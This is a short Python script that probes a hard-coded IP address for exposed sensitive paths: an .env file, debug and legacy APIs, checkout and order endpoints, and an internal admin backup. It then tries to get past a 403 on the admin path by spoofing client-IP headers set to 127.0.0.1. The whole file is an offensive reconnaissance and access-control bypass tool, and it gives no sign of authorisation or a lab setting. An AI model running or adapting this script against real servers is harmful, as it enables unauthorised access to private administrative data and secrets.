import urllib.request

base_url = "http://159.194.250.157:8080"

paths = [
    "/.env.example",
    "/api/debug/",
    "/api/debug",
    "/api/v1/legacy/",
    "/api/v1/legacy",
    "/checkout/",
    "/order/",
    "/internal/admin-backup",
]

for p in paths:
    url = base_url + p
    # Try normal request
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = resp.read()
            print(f"{p}: status {resp.status}, len {len(data)}")
            print("  ", repr(data[:150]))
    except urllib.error.HTTPError as e:
        print(f"{p}: HTTP {e.code}")
        # If 403 on /internal/admin-backup, try bypass headers
        if p.startswith("/internal") and e.code == 403:
            for header_name in ["X-Forwarded-For", "X-Real-IP", "X-Remote-Addr", "X-Originating-IP", "X-Custom-IP-Authorization"]:
                try:
                    req2 = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", header_name: "127.0.0.1"})
                    with urllib.request.urlopen(req2, timeout=3) as resp2:
                        print(f"  [BYPASS with {header_name}]: {resp2.status}, len {len(resp2.read())}")
                except Exception as e2:
                    pass
    except Exception as e:
        print(f"{p}: error {e}")
